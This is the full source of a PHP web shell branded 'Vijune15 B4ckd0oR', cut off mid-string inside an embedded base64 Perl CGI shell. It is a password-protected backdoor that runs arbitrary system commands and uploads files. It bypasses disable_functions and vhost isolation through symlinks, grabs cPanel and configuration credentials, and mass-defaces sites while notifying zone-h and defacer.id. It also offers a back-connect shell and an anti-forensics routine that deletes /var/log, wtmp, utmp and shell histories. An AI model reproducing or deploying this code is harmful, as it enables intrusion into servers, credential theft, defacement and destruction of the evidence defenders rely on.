<?php

session_start();
set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Singapura");
$auth_pass = "d74f6340a1559158174e1ea968564bb5"; // 
if(get_magic_quotes_gpc()) { 	
function VEstripslashes($array) { 		
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 


function Login() {
	die("
<html>
<head>
<title>Vijune15 Numpang Lewat</title>
<style type='text/css'>
html {
    margin: 20px auto;
    background:black;
    color: green;
    text-align: center;
}
pre {
    color: white;
}

input[type=password] {
	background:transparent;
	color:black;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px black;
}

</style>
</head>
<center>
<br>
<br>
<header>
<link href='http://fonts.googleapis.com/css?family=Iceberg' rel='stylesheet' type='text/css'>
<img src='https://a.top4top.net/p_1061h7bzr0.gif' width='400' height='300' align='center'> <br>
<font face='Iceberg' size='6' color='red'><b>Vijune15 <font color='white'>Will Never die </font></b>
<br>
<br>
<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<!DOCTYPE HTML>
<HTML>
<HEAD>
<CENTER>
<link href="" rel="stylesheet" type="text/css">
<title>Vijune15 B4ckd0oR</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<style>
* {
 	font-family: Electrolize, sans-serif;
}
 	body { 
    background-color: black;
    background-size: 100%;
    background-repeat:no-repeat;
    margin: 0px;
 	font-family: "Electrolize", sans-serif; cursive;color:#0000ff;
 	font-size: 13px;
}
hr {
	background-color: #0000ff; height: 3px; border: 0; 
}
a { 
 	text-decoration:none; color:#ffd700; cursor: auto;} a:hover{
 	border-bottom-width: 1px;
 	border-bottom-style: solid;
 	border-bottom-color: #ffffff;
}
tbody {
 	display: table-row-group;
 	vertical-align: middle;
 	border-color: inherit;
}
table {
 	white-space: normal;
 	line-height: normal;
 	font-weight: normal;
 	font-style: normal;
 	color: -internal-quirk-inherit;
 	text-align: start;
 	font-variant: normal normal;
}
table {
 	display: table;
 	border-collapse: separate;
 	border-spacing: 2px;
 	border-color: grey;
}
tr {
 	display: table-row;
 	vertical-align: inherit;
 	border-color: inherit;
}
td, th {
 	display: table-cell;
 	vertical-align: inherit;
}
#menu a {
     font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
     font-size: 12px;
     background:#191919;
     color:white;
     margin:5px 2px 4px 2px;
     padding:5px 8px;
     border-color: cyan;
     text-decoration:none;
     letter-spacing:1px;
     -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
#menu a:hover {
     font-size: 12px;
     background:#191919;-webkit-transform:rotate(0.0deg);-moz-transform:rotate(0.0deg);-ms-transform:rotate(0.0deg);-o-transform:rotate(0.0deg);transform:rotate(0.0deg);
     color: white;
     padding:5px 8px;
     margin:1px;
     border: 1px;
     font-family:ubuntu_monoregular;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1;
     letter-spacing:1px;
     margin:5px 2px 4px 2px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }

.content{ 
 	width:100%; text-decoration:none; color:#0000ff;  
} 
a { 
    -webkit-transition:all .4s ease-in-out;-moz-transition:all .4s ease-in-out;-o-transition:all .4s ease-in-out;-ms-transition:all .4s ease-in-out;transition:all .4s ease-in-out text-decoration:none; 
} 
.content a:link {
 	text-decoration: none;
}
.content a:visited { 
}
.content a:hover {
 	background: #b3eeff; color: black; 
}
.content td{ 
 	padding:0 8px; line-height:24px; 
} 
.content th{ 
 	background: #191919; padding:3px 8px; font-weight:normal; 
} 
.content tr:hover{
 	cursor:pointer;
 	background-color: #111111;
}
input[type=submit]{ 
 	background:#000000; 
 	color:#b3eeff; 
 	margin:0 4px; 
 	font-size:13px; 
 	border:1px solid #444444; 
 	cursor:pointer;
 	-moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    -khtml-border-radius: 5px;
} 
input[type=submit]:hover{ 
 	border-bottom:1px solid #ffffff;
 	font-size:13px; 
 	border-top:1px solid #ffffff; 
}
input[type=text], option, select {
 	background:#000000; 
 	border:0; 
 	padding:2px; 
 	border-bottom:1px solid #0000ff;
 	color:#ffd700;
}
textarea {
 	margin:auto;
 	border:1px solid #333333;
 	width:100%;
 	height:400px;
 	background:#000000;
 	color:#ffd700;
 	padding:0 2px;
 	font-size:12px;
}
#nav{position:fixed;z-index:999;top:0;width:100%;left:76%;
}
a.nav-fokus {display:block; width:auto; height:auto; background:transparent; border-top:0px; border-left: 1px solid #fff; border-right:1px solid #fff;  border-bottom:1px solid #fff;  padding:5px 8px; text-align:center; text-decoration:none; color:#b3eeff; line-height:20px; overflow:hidden; float:left;
}
a.nav-fokus:hover {color:#FFFFFF; background:#191919; border-top:0px; border-left: 1px solid #fff; border-right:1px solid #fff;  border-bottom:1px solid #fff;
}
</style>
</head>

<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function sulap($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
	}
  return stripslashes($text);
}
function defid($url,$nick,$team) {
$ch = curl_init("https://defacer.id/archives/notify");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "attacker=$nick&team=$team&poc=SQL Injection&url=$url");
return curl_exec($ch);
curl_close($ch);
}
function zoneh($url,$nick) {
$ch = curl_init("http://www.zone-h.com/notify/single");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
return curl_exec($ch);
curl_close($ch);
}
function GrabUrl($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lol\r\n";
			}
        }
}
function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
$_c7e = 'WGFpIFN5bmRpY2F0ZQ==';
$sys = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
$getds = @ini_get("disable_functions");
$ds = showdisablefunctions().' <font color=white>on</font> <font color=teal>'.php_sapi_name().'</font>';
$mysql = (function_exists('mysql_connect')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
$python = (exe('python --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
$home_r = $_SERVER['DOCUMENT_ROOT'];
$_COPY = base64_decode($_c7e);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$path/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=green>Uploaded!</font> at <i><b>$path/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>Failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		}
	}
	echo "<center>
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($path,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form></center>";
	echo "<center>".$act."</center>";
echo"
System : <font color=#b3eeff>".php_uname()."</font><br>
Server IP : <font color=#b3eeff>".gethostbyname($_SERVER["HTTP_HOST"])."</font> | Your IP : <font color=#b3eeff>".$_SERVER["REMOTE_ADDR"]."</font><br>
Safe Mode : <font color=#b3eeff>".$sm."</font><br>
Time On Server : <font color=#b3eeff>".date("d M Y h:i:s a")."</font><br>
Disable Functions : <font color=#b3eeff>".$ds."</font><br>
MySQL : ".$mysql." | Perl : ".$perl." | Python : ".$python." | WGET : ".$wget." | CURL : ".$curl."<br>
Mirror : <a href='?path=$path&mirror=zoneh'>Zone-H</a> / <a href='?path=$path&mirror=defid'>DefacerID</a><br>
Telnet : <a href='?path=$path&jancok=cgi'>CGI Perl</a> / <a href='?path=$path&jancok=cgi2'>CGI Perl 2</a> / <a href='?path=$path&jancok=cgipy'>CGI Python</a><br>
Bypass : <a href='?path=$path&amp;bypass=disablefunc'>Disable Functions</a> / <a href='?path=$path&amp;bypass=passwd'>Bypass /etc/passwd</a> / <a href='?path=$path&amp;bypass=vhosts'>Bypass Vhosts</a><br>
Symlink : <a href='?path=$path&symlink=server'>Symlink Server</a> / <a href='?path=$path&symlink=404'>Symlink 404</a> / <a href='?path=$path&symlink=python'>Symlink Python</a><br>
Tools : <a href='?path=$path&jancok=cmd'>Command</a> / <a href='?path=$path&jancok=mass'>Mass</a> / <a href='?path=$path&jancok=adminer'>Adminer</a>
 / <a href='?path=$path&jancok=jumping'>Jumping</a> / <a href='?path=$path&jancok=cpanel'>Grab Cpanel</a> / <a href='?path=$path&config=grabber'>Config</a> / <a href='?path=$path&mass=changer'>Mass User Changer</a> / <a href='?path=$path&mass=title'>Mass Title Changer</a>
/ <a href='?path=$path&backconnect=tool'>Back Connect</a>";
echo "<div id='nav'>
<a class='nav-fokus' href='?'><b>Home</b></a><a class='nav-fokus' href='?path=$path&delete=logs'><b>Delete Logs</b></a><a class='nav-fokus' href='?path=$path&kill=self'><b>Kill Self</b></a><a class='nav-fokus' href='?path=$path&jancok=logout'><b>Log-Out</b></a></div>";
echo '
<br>
<hr color="#191919">
<br>
<table width="700" align="center">
<tr><td><font color="white">Current Path :</font>';
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr>';
echo '</table>';
echo '<br><hr color="#191919"><br>';
if($_GET['jancok'] == 'logout') {
echo '<form action="?patch='.$path.'&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Good Bye!!';
} elseif($_GET['con7ext'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
} elseif($_GET['delete'] == 'logs') {
  	echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br>Deleting .../tmp/logs ';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history </p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history </p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout </p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs </p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log </p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs </p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log </p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp </p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs </p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log </p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm </p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp </p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp </p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE </p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog </p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp </p>';

	sleep(4);

	echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
	echo"</td></tr></table>";
} elseif($_GET['bypass'] == 'vhosts'){
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){
                        mkdir('symvhosts', 0755);
                        chdir('symvhosts');
                        system('ln -s / Rintoar.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Rintoar.txt");
			$rt="<br><a href=symvhosts/Rintoar.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt<br>Note: Apabila Forbidden pas buka /var/www/vhosts/Domain.com/ harap tambahkan httpdocs ex:/var/www/vhosts/Domain.com/httpdocs/</center>";} echo "</form>";
} elseif($_GET['jancok'] == 'cgi2') {
	$cgi_dir = mkdir('con7ext_cgi', 0755);
        chdir('con7ext_cgi');
	$file_cgi = "cgi2.con7ext";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .con7ext \n AddHandler cgi-script .con7ext \n AddHandler cgi-script .con7ext";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFJlY29kZWQgQnkgQ29uN2V4dA0KIyBUaGFua3MgVG8gOiAweDE5OTkgLSBYYWkgU3luZGljYXRlIFRlYW0gLSBBbmQgWW91DQogDQokV2luTlQgPSAwOw0KJE5UQ21kU2VwID0gIiYiOw0KJFVuaXhDbWRTZXAgPSAiOyI7DQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0Kc3ViIFJlYWRQYXJzZQ0Kew0KICAgIGxvY2FsICgqaW4pID0gQF8gaWYgQF87DQogICAgbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCiAgIA0KICAgICRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KIA0KICAgIGlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQogICAgew0KICAgICAgICAkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCiAgICB9DQogICAgZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQogICAgew0KICAgICAgICBiaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQogICAgICAgIHJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQogICAgfQ0KIA0KICAgICMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCiAgICBpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCiAgICB7DQogICAgICAgICRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCiAgICAgICAgQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCiAgICAgICAgJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiAgICAgICAgJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KICAgICAgICAkSGVhZGVyID0gJGA7DQogICAgICAgICRCb2R5ID0gJCc7DQogICAgICAgICRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCiAgICAgICAgJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQogICAgICAgICRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsNCiAgICAgICAgJGlueydmJ30gPSAkMTsNCiAgICAgICAgJGlueydmJ30gPX4gcy9cIi8vZzsNCiAgICAgICAgJGlueydmJ30gPX4gcy9ccy8vZzsNCiANCiAgICAgICAgIyBwYXJzZSB0cmFpbGVyDQogICAgICAgIGZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgICRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KICAgICAgICAgICAgJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KICAgICAgICAgICAgJGtleSA9ICQxOw0KICAgICAgICAgICAgJHZhbCA9ICQnOw0KICAgICAgICAgICAgJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KICAgIHsNCiAgICAgICAgQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KICAgICAgICBmb3JlYWNoICRpICgwIC4uICQjaW4pDQogICAgICAgIHsNCiAgICAgICAgICAgICRpblskaV0gPX4gcy9cKy8gL2c7DQogICAgICAgICAgICAoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KICAgICAgICAgICAgJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiAgICAgICAgICAgICR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQogICAgICAgICAgICAkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCiAgICAgICAgICAgICRpbnska2V5fSAuPSAkdmFsOw0KICAgICAgICB9DQogICAgfQ0KfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+Q29uN2V4dDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCjxzdHlsZT4NCkBmb250LWZhY2Ugew0KICAgIGZvbnQtZmFtaWx5OiAndWJ1bnR1X21vbm9yZWd1bGFyJzsNCnNyYzogdXJsKGRhdGE6YXBwbGljYXRpb24veC1mb250LXdvZmY7Y2hhcnNldD11dGYtODtiYXNlNjQsZDA5R1JnQUJBQUFBQUdXSUFCTUFBQUFBdkRBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJHUmxSTkFBQUJxQUFBQUJ3QUFBQWNaTytIZEVkRVJVWUFBQUhFQUFBQUtRQUFBQ3dDSXdFSlIxQlBVd0FBQWZBQUFBQXlBQUFBUURYT1RyQkhVMVZDQUFBQ0pBQUFBVmtBQUFJR2xOdkpxRTlUTHpJQUFBT0FBQUFBWFFBQUFHQ1pWUVRaWTIxaGNBQUFBK0FBQUFHT0FBQUI2Z0NMakJaamRuUWdBQUFGY0FBQUFFb0FBQUJLRTBrT2MyWndaMjBBQUFXOEFBQUJzUUFBQW1WVHRDK25aMkZ6Y0FBQUIzQUFBQUFJQUFBQUNBQUFBQkJuYkhsbUFBQUhlQUFBVm1FQUFLVzBJcnQyUEdobFlXUUFBRjNjQUFBQU1BQUFBRFlBeTJMRGFHaGxZUUFBWGd3QUFBQWNBQUFBSkFxbUJQOW9iWFI0QUFCZUtBQUFBV2dBQUFPaWhtRnhDR3h2WTJFQUFGK1FBQUFCeUFBQUFkUU9VVGFRYldGNGNBQUFZVmdBQUFBZ0FBQUFJQUlHQWhWdVlXMWxBQUJoZUFBQUFYc0FBQVBPWWxlS3JYQnZjM1FBQUdMMEFBQUI0Z0FBQXRRc0JxVU1jSEpsY0FBQVpOZ0FBQUNuQUFBQkJxUVR2RzUzWldKbUFBQmxnQUFBQUFZQUFBQUdkVnRTcGdBQUFBRUFBQUFBekQyaXp3QUFBQURKNWI3TEFBQUFBTTdNSmRsNDJtTmdaR0JnNEFOaUZRWVFZR0pnQnVJNkJrYUdlb1pHSUt1SjRRV1F6UUtXWVFBQU5tSURMUUFBQUhqYVkyQmtZR0RnWXJCaHNHTmdUcTRzeW1FUVNTOUt6V2FReTBrc3lXUFFZR0FCeWpMOC93OGtzTEdBQUFCM2t3djdBQUI0Mm5XUngwcERRUmlGditzMUxrSndGUXZpSW9nbDloaGpMOFFTQkdNTVhGMjVFR0tNTGt3aTNCaEJpU3Q3N3cwN1BvVzRzN